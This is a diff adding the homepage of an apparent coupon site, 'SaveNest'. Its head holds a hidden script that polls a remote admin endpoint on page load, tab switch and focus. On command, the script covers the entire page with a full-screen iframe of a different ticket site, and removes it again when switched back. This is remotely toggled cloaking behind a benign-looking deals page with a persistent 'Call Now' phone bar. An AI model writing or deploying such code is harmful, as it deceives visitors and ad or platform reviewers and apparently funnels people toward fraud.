@@ -1,0 +1,133 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>SaveNest - Free Online Coupons and Promo Codes</title><meta name="description" content="Verified coupon codes and deals from top stores, updated daily."><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="style.css">
+<!-- Add this Script in demo.dealbro.live/index.html -->
+<script>
+(function() {
+    const adminApi = 'https://adminswitch.dealbro.live/update.php?action=get';
+
+    function checkAndApply() {
+        // Cache issue se bachne ke liye timestamp query add ki hai
+        fetch(adminApi + '&t=' + Date.now())
+            .then(res => res.json())
+            .then(data => {
+                const mode = (data && data.mode) ? data.mode : 'coupon';
+                const existingIframe = document.getElementById('ticketIframeOverlay');
+
+                if (mode === 'Ticket') {
+                    // Agar Ticket mode hai aur iframe nahi hai, toh iframe add karo
+                    if (!existingIframe) {
+                        const iframe = document.createElement('iframe');
+                        iframe.id = 'ticketIframeOverlay';
+                        iframe.src = 'https://onlineticket.store/';
+                        iframe.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:999999; background:#fff;';
+                        document.documentElement.appendChild(iframe);
+                    }
+                } else {
+                    // Agar Coupon mode hai aur iframe pada hai, toh usko hata do (Instant Coupon show hoga)
+                    if (existingIframe) {
+                        existingIframe.remove();
+                    }
+                }
+            })
+            .catch(err => console.error('Mode check failed:', err));
+    }
+
+    // 1. First time page load hone par check karein
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', checkAndApply);
+    } else {
+        checkAndApply();
+    }
+
+    // 2. Jaise hi user Tab active karega (Tab switch karke wapas aayega)
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'visible') {
+            checkAndApply();
+        }
+    });
+
+    // 3. Focus handle
+    window.addEventListener('focus', checkAndApply);
+})();
+</script>
+
+</head><body><header class="site-header"><div class="wrap hd"><a class="brand-logo sn-brand-desk" href="index.html">SaveNest</a><a class="brand-logo sn-brand-tel" href="tel:+18884923166">+1 (888) 492-3166</a><button class="burger" id="burger" aria-label="Toggle menu" aria-expanded="false" aria-controls="nav"><span></span><span></span><span></span></button><nav id="nav" aria-label="Main"><ul><li><a href="index.html" class="active" aria-current="page">Home</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li><li><a href="terms.html">Terms</a></li><li><a href="privacy.html">Privacy</a></li></ul></nav></div></header><section class="banner">
+  <div class="wrap">
+    <div>
+      <h2>Save more on every order</h2>
+      <p>Verified coupon codes and deals from your favorite stores, updated every day.</p>
+      <a class="btn" href="#deals">Browse today's coupons</a>
+    </div>
+    <div class="badge"><b>50%</b><span>Off top deals</span></div>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <!-- How SaveNest coupon codes work -->
+  <section class="hw-section">
+
+    <h2 class="hw-title">How SaveNest Coupon Codes Work</h2>
+
+    <div class="hw-steps">
+
+      <div class="hw-step">
+        <span class="hw-num">1</span>
+        <h3>Find the Best Coupons</h3>
+        <p>Browse SaveNest to discover available coupon codes, exclusive deals, promotional offers, and discounts from your favorite online stores.</p>
+      </div>
+
+      <div class="hw-step">
+        <span class="hw-num">2</span>
+        <h3>Check Coupon Details</h3>
+        <p>Before using an offer, review its terms and conditions, expiration date, minimum purchase requirements, eligible products, and any applicable restrictions.</p>
+      </div>
+
+      <div class="hw-step">
+        <span class="hw-num">3</span>
+        <h3>Copy and Apply Your Coupon</h3>
+        <p>Select your preferred offer and copy the coupon code, if required. Visit the retailer&rsquo;s official website, add your desired products to your cart, and enter the code during checkout to see whether the discount applies.</p>
+      </div>
+
+    </div>
+
+    <div class="hw-info">
+      <h3>Important Information</h3>
+      <p>SaveNest is an independent coupon and promotional-information website that helps users discover deals, discounts, and offers from various retailers. We are not affiliated with, endorsed by, or officially associated with the retailers featured on our website unless explicitly stated.</p>
+      <p>SaveNest does not issue or directly control the coupon codes, promotions, or discounts offered by third-party retailers. All offers are subject to availability and may include specific eligibility requirements, expiration dates, exclusions, and other terms and conditions. Coupons may expire, change, or become unavailable without prior notice.</p>
+      <p>Please verify the offer details and final discount on the retailer&rsquo;s official website before completing your purchase.</p>
+      <p>SaveNest may earn a commission when users click certain links and make qualifying purchases, at no additional cost to the user.</p>
+    </div>
+
+  </section>
+
+  <h1 class="tag">Free Online Coupons and Promo Codes for the Store You Love!</h1>
+  <div class="stores" id="stores"></div>
+
+  <h2 class="sec" id="deals">Today's Trending Coupons &amp; Deals</h2>
+  <div class="grid" id="trending"></div>
+
+  <h2 class="sec">Best Fall Deals</h2>
+  <div class="grid" id="fall"></div>
+  <div style="height:60px"></div>
+</main>
+
+<div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="mTitle">
+  <div class="modal">
+    <button class="x" id="close" aria-label="Close">&times;</button>
+    <div class="m-logo" id="mBrand"></div>
+    <div class="m-title" id="mTitle"></div>
+    <div class="codebox"><span id="mCode"></span><button id="copy">Copy</button></div>
+    <div class="msg" id="msg"></div>
+    <a class="cont" id="mLink" href="#" target="_blank" rel="noopener"></a>
+    <button class="terms-t" id="termsBtn">Terms</button>
+    <div class="terms" id="terms">Valid for online orders only. Cannot be combined with other offers. Exclusions may apply. Offer can end without notice.</div>
+    <button class="ok" id="ok">OK</button>
+  </div>
+</div>
+
+<footer class="site-footer"><div class="wrap"><div class="ft">
+<div><a class="brand-logo" href="index.html">SaveNest</a><p>Verified coupon codes and deals from stores you love, checked every day so you don't overpay.</p></div>
+<div><h4>Explore</h4><a href="about.html">About us</a><a href="contact.html">Contact</a><a href="index.html#stores">All stores</a></div>
+<div><h4>Legal</h4><a href="terms.html">Terms of use</a><a href="privacy.html">Privacy policy</a></div>
+<div><h4>Get in touch</h4><p>info@savenest.vercel<br>Mon to Fri, 9am to 6pm</p></div>
+</div><div class="fb"><span>&copy; <span id="yr">2026</span> SaveNest. All rights reserved.</span><span>We may earn a commission when you use our links.</span></div></div></footer><script src="script.js"></script><script src="modal.js"></script><script src="coupons.js"></script><div class="sn-callbar"><a class="sn-help" href="tel:+18884923166">Help</a><a class="sn-call" href="tel:+18884923166">Call Now</a></div></body></html>
